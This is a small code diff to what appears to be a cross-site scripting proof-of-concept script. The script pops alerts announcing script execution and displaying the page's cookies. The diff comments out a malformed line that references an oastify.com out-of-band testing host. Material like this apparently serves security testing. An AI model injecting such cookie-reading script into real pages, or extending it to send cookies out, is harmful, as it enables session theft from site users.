@@ -1,5 +1,5 @@
 alert("cross domain script execution done ");
-alert(<iframe=https://quouyboidt4h25chmacp9un2ut0koacz.oastify.com>);
+// alert(<iframe=https://quouyboidt4h25chmacp9un2ut0koacz.oastify.com>);
 alert("Cookies: " + document.cookie);
 // Set background color to red
 // document.body.style.backgroundColor = "red";
